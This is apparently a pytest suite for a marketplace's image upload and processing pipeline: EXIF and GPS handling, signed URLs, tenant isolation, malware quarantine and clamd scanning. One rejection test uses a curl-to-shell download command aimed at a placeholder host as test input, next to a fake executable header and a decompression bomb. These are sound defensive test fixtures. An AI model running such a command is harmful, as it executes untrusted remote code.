from __future__ import annotations

import io
import socket
import struct
import threading
import uuid

import pytest
from PIL import Image
from sqlalchemy import select

from app.core.db import session_scope
from app.domains.billing.models import EntitlementOverride
from app.domains.media import imaging
from app.domains.media.models import MediaAsset
from app.domains.media.scanner import ClamdScanner, ScanResult
from tests.conftest import onboard

API = "/api/v1"


# ----------------------------------------------------------------------------- fixtures
def phone_photo(w: int = 1600, h: int = 1200, orientation: int | None = 6, gps: bool = True) -> bytes:
    """A 'phone camera' JPEG: landscape pixels + EXIF Orientation=6 (rotate 90) + GPS location."""
    img = Image.new("RGB", (w, h), (180, 40, 60))
    for x in range(0, w, 40):  # stripes give it edges so it isn't flagged blurry
        img.paste((240, 220, 200), (x, 0, x + 8, h))
    exif = Image.Exif()
    if orientation:
        exif[0x0112] = orientation
    if gps:
        exif[0x8825] = {1: "N", 2: (27.0, 42.0, 30.0), 3: "E", 4: (85.0, 18.0, 45.0)}  # Thamel, Kathmandu
    buf = io.BytesIO()
    img.save(buf, "JPEG", exif=exif.tobytes(), quality=90)
    return buf.getvalue()


def png(w: int, h: int, color=(20, 20, 20)) -> bytes:
    buf = io.BytesIO()
    Image.new("RGB", (w, h), color).save(buf, "PNG")
    return buf.getvalue()


def upload(client, s, data: bytes, ctype: str = "image/jpeg", name: str = "IMG_2041.jpg"):
    r = client.post(
        f"{API}/media/uploads",
        headers=s.h(),
        json={"file_name": name, "content_type": ctype, "size_bytes": len(data)},
    )
    assert r.status_code == 201, r.text
    up = r.json()["upload"]
    put = client.put(up["url"], content=data, headers=up["headers"])
    assert put.status_code == 200, put.text
    done = client.post(f"{API}/media/{r.json()['asset_id']}/complete", headers=s.h())
    assert done.status_code == 202, done.text
    import app.domains.handlers  # noqa: F401
    from app.domains.platform.outbox import dispatch_batch

    dispatch_batch()
    return client.get(f"{API}/media/{r.json()['asset_id']}", headers=s.h()).json()


# ----------------------------------------------------------------------------- pipeline (pure)
def test_imaging_applies_orientation_strips_gps_and_builds_padded_derivatives():
    out = imaging.process(phone_photo())
    assert (out.width, out.height) == (1200, 1600)  # EXIF orientation applied
    assert out.had_location is True
    sizes = {d.kind: (d.width, d.height) for d in out.derivatives}
    assert sizes["square_white"] == (1080, 1080) and sizes["portrait_4_5"] == (1080, 1350)
    assert sizes["story_9_16"] == (1080, 1920) and max(sizes["thumb"]) == 320
    for d in out.derivatives:
        reopened = Image.open(io.BytesIO(d.data))
        assert not reopened.getexif().get_ifd(0x8825), f"{d.kind} leaked GPS"
        assert 0x0112 not in reopened.getexif()
    # Padding never crops or recolours the product: square canvas corners are pure white.
    sq = Image.open(io.BytesIO(next(d.data for d in out.derivatives if d.kind == "square_white"))).convert(
        "RGB"
    )
    assert sq.getpixel((2, 2)) == (255, 255, 255)


@pytest.mark.parametrize(
    ("data", "reason"),
    [
        (b"#!/bin/sh\ncurl evil.example | sh\n", "not_an_image"),
        (b"%PDF-1.7 fake", "not_an_image"),
        (png(8000, 8000), "image_too_large"),  # 64 MP decompression bomb (tiny file, huge pixels)
    ],
)
def test_imaging_rejects_non_images_and_bombs(data, reason):
    import warnings

    from PIL import Image

    with warnings.catch_warnings():
        warnings.simplefilter("ignore", Image.DecompressionBombWarning)  # the bomb case is the point
        with pytest.raises(imaging.ImageRejected) as e:
            imaging.process(data)
    assert e.value.reason == reason


def test_quality_flags():
    dark = imaging.process(png(1200, 1200, (5, 5, 5)))
    assert {"too_dark", "blurry"} <= set(dark.quality_flags) and dark.quality_score < 0.6
    tiny = imaging.process(phone_photo(400, 300, orientation=None, gps=False))
    assert "low_resolution" in tiny.quality_flags
    good = imaging.process(phone_photo())
    assert good.quality_flags == [] and good.quality_score == 1.0


def test_heic_from_iphone_is_accepted():
    import pillow_heif

    try:
        buf = io.BytesIO()
        Image.new("RGB", (1000, 800), (30, 90, 160)).save(buf, format="HEIF")
    except (KeyError, OSError, ValueError):
        pytest.skip("libheif encoder not available in this environment")
    assert pillow_heif  # registered opener
    out = imaging.process(buf.getvalue())
    assert out.format in ("HEIF", "HEIC") and out.width == 1000


# ----------------------------------------------------------------------------- HTTP flow
def test_signed_upload_flow_to_ready_with_urls_and_product_attach(client, seller):
    view = upload(client, seller, phone_photo())
    assert view["status"] == "ready" and view["stripped_location_metadata"] is True
    assert view["scan_status"] == "skipped"  # dev scanner; production requires clamd
    thumb = view["derivatives"]["thumb"]
    img = client.get(thumb["url"])
    assert img.status_code == 200 and img.headers["content-type"] == "image/webp"

    prod = client.post(
        f"{API}/catalog/products",
        headers=seller.h(),
        json={"title": "Maroon Kurta", "variants": [{"price_minor": 245000}]},
    ).json()
    r = client.put(
        f"{API}/catalog/products/{prod['id']}/media",
        headers=seller.h(),
        json={"items": [{"asset_id": view["id"], "alt_text": "Maroon kurta, front"}]},
    )
    assert r.status_code == 200
    media = r.json()["media"]
    assert media[0]["asset_id"] == view["id"] and media[0]["thumb"]["url"]
    assert (
        client.delete(f"{API}/media/{view['id']}", headers=seller.h()).json()["error"]["code"]
        == "media_in_use"
    )


def test_upload_rejections_are_visible_not_silent(client, seller):
    view = upload(client, seller, b"MZ\x90\x00 definitely an exe", name="photo.jpg")
    assert view["status"] == "rejected" and view["rejection_reason"] == "not_an_image"
    assert view["derivatives"] == {}


def test_upload_request_validation_and_storage_limit(client, seller):
    r = client.post(
        f"{API}/media/uploads",
        headers=seller.h(),
        json={"file_name": "a.gif", "content_type": "image/gif", "size_bytes": 10},
    )
    assert r.status_code == 400 and r.json()["error"]["code"] == "unsupported_media_type"
    r = client.post(
        f"{API}/media/uploads",
        headers=seller.h(),
        json={"file_name": "a.jpg", "content_type": "image/jpeg", "size_bytes": 50 * 1024 * 1024},
    )
    assert r.json()["error"]["code"] == "file_too_large"
    with session_scope() as db:
        db.add(
            EntitlementOverride(
                merchant_id=uuid.UUID(seller.merchant_id),
                resource_code="storage_mb",
                period="lifetime",
                limit_value=1,
                reason="test",
            )
        )
    r = client.post(
        f"{API}/media/uploads",
        headers=seller.h(),
        json={"file_name": "a.jpg", "content_type": "image/jpeg", "size_bytes": 3 * 1024 * 1024},
    )
    assert r.status_code == 402 and r.json()["error"]["details"]["resource"] == "storage_mb"


def test_signed_url_tamper_and_complete_without_upload(client, seller):
    r = client.post(
        f"{API}/media/uploads",
        headers=seller.h(),
        json={"file_name": "a.jpg", "content_type": "image/jpeg", "size_bytes": 100},
    ).json()
    url = r["upload"]["url"]
    tampered = url.replace("sig=", "sig=0")
    assert client.put(tampered, content=b"x").status_code == 403
    other_key = url.replace(r["asset_id"], str(uuid.uuid4()))
    assert client.put(other_key, content=b"x").status_code == 403  # signature is bound to the key
    done = client.post(f"{API}/media/{r['asset_id']}/complete", headers=seller.h())
    assert done.status_code == 409 and done.json()["error"]["code"] == "upload_missing"


def test_media_is_tenant_isolated(client):
    a = onboard(client, shop="Asan Bazaar Goods")
    b = onboard(client, shop="Patan Crafts")
    view = upload(client, a, phone_photo())
    assert client.get(f"{API}/media/{view['id']}", headers=b.h()).status_code == 404
    prod = client.post(
        f"{API}/catalog/products", headers=b.h(), json={"title": "Bowl", "variants": [{"price_minor": 1000}]}
    ).json()
    r = client.put(
        f"{API}/catalog/products/{prod['id']}/media",
        headers=b.h(),
        json={"items": [{"asset_id": view["id"]}]},
    )
    assert r.status_code == 404 and r.json()["error"]["code"] == "media_not_found"


def test_infected_upload_is_quarantined(client, seller, monkeypatch):
    from app.domains.media import service

    monkeypatch.setattr(
        service,
        "get_scanner",
        lambda: type("S", (), {"scan": lambda self, d: ScanResult("infected", "Eicar-Test")})(),
    )
    view = upload(client, seller, phone_photo())
    assert view["status"] == "rejected" and view["rejection_reason"] == "malware_detected"
    from app.domains.integrations.storage import get_storage

    with session_scope() as db:
        key = db.scalar(select(MediaAsset.original_key).where(MediaAsset.id == uuid.UUID(view["id"])))
    with pytest.raises(FileNotFoundError):
        get_storage().get(key)


def test_scanner_outage_retries_instead_of_skipping(client, seller, monkeypatch):
    from app.domains.media import service

    monkeypatch.setattr(
        service, "get_scanner", lambda: type("S", (), {"scan": lambda self, d: ScanResult("error")})()
    )
    view = upload(client, seller, phone_photo())
    assert view["status"] == "uploaded"  # not processed, not silently accepted
    from app.domains.platform.models import OutboxEvent

    with session_scope() as db:
        ev = db.scalar(select(OutboxEvent).where(OutboxEvent.event_type == "media.uploaded"))
        assert ev.status == "pending" and ev.attempts == 1 and "scanner unavailable" in ev.last_error


# ----------------------------------------------------------------------------- clamd protocol
def _fake_clamd(reply: bytes) -> int:
    srv = socket.socket()
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)

    def run() -> None:
        conn, _ = srv.accept()
        with conn:
            assert conn.recv(10) == b"zINSTREAM\0"
            while True:
                (n,) = struct.unpack("!L", conn.recv(4))
                if n == 0:
                    break
                remaining = n
                while remaining:
                    remaining -= len(conn.recv(remaining))
            conn.sendall(reply)
        srv.close()

    threading.Thread(target=run, daemon=True).start()
    return srv.getsockname()[1]


def test_clamd_protocol_clean_and_infected():
    assert ClamdScanner("127.0.0.1", _fake_clamd(b"stream: OK\0")).scan(b"x" * 100_000).status == "clean"
    res = ClamdScanner("127.0.0.1", _fake_clamd(b"stream: Eicar-Test-Signature FOUND\0")).scan(b"X5O!P%@AP")
    assert res.status == "infected" and res.signature == "Eicar-Test-Signature"
    assert ClamdScanner("127.0.0.1", 1, timeout_s=0.5).scan(b"x").status == "error"


def test_upload_slot_creation_is_idempotent(client, seller):
    body = {"file_name": "a.jpg", "content_type": "image/jpeg", "size_bytes": 1000}
    h = seller.h(**{"Idempotency-Key": "upload-slot-0001"})
    r1 = client.post(f"{API}/media/uploads", headers=h, json=body)
    r2 = client.post(f"{API}/media/uploads", headers=h, json=body)
    assert r1.status_code == r2.status_code == 201
    assert r1.json()["asset_id"] == r2.json()["asset_id"] and r2.headers["Idempotent-Replayed"] == "true"
